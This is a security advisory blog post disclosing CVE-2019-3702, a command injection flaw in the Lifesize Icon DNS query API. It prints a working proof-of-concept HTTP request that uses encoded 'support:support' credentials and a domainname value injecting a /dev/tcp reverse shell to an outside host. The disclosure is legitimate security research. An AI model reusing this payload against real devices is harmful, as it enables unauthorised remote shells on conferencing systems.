---
layout: post
title: "CVE-2019-3702: Remote Code Execution in Lifesize Icon"
date:   2019-03-26 09:00:00
image:
      url: /assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg
video: false
comments: true
theme_color: 302F2D

author: 'Patrick Münch'

author_image: "https://avatars0.githubusercontent.com/u/7220740?s=400"
author_link: "https://twitter.com/atomiczero111"
---

# Overview

- Vendor: Lifesize
- Product: Lifesize Icon
- Version: LS_RM3_3.7.0 (2421)
- Vulnerability: Remote Code Execution

# Background

LifeSize Icon is a video collaboration platform and consists of various components, e.q. software, video and phone systems.

From the vendor's website:
"For more than a decade, Lifesize has been at the forefront of video collaboration delivering high-quality technology designed to bring people together. Our focus is on developing market-leading products that deliver easy-to-use and scalable audio, web and video conferencing. We combine an integrated, best-in-class cloud-based conferencing experience, with award-winning, easy-to-use HD camera systems and HD phones so that you can connect to anyone, anywhere. It’s a meeting experience like no other."

# Issue Description

While analyzing the implementation of LifeSize Icon Software, one Remote Code Execution vulnerability has been identified, which can be exploited in order to execute arbitrary commands within the DNS Query address field. This vulnerability can be exploited by authenticated attackers with access to the web interface.

The system provides a JSON API, which exposes various methods like the DNS Query function. This function contains a address field that can be exploited with a remote command execution.

The following HTTP request illustrates this approach:

__HTTP-Request__

~~~ http
POST /rest/request/8cb1a00d113443c6a9a220104bbdea33/Comm_dnsQuery HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101
Firefox/63.0
Accept: */*
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://1.1.1.1/
X-Client: icon-web-client
Authorization: LSBasic c3VwcG9ydDpzdXBwb3J0
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 142
Connection: close

{"call":"Comm_dnsQuery","params":{"type":"A","domainname": "1.1.1.2; 0<&196;exec 196<>/dev/tcp/1.1.1.2/4446; sh <&196 >&196 2>&196"}}
~~~

# CVE

[CVE-2019-3702](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-3702)

# CVSSv3 Base Score

CVSS Base Score: __8.8__

CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

# Credit

Patrick Muench of [SVA System Vertrieb Alexander GmbH](https://www.sva.de)

Joshua Lehr

# Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

The contents of this advisory are copyright (c) 2019 SVA System Vertrieb Alexander GmbH and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.
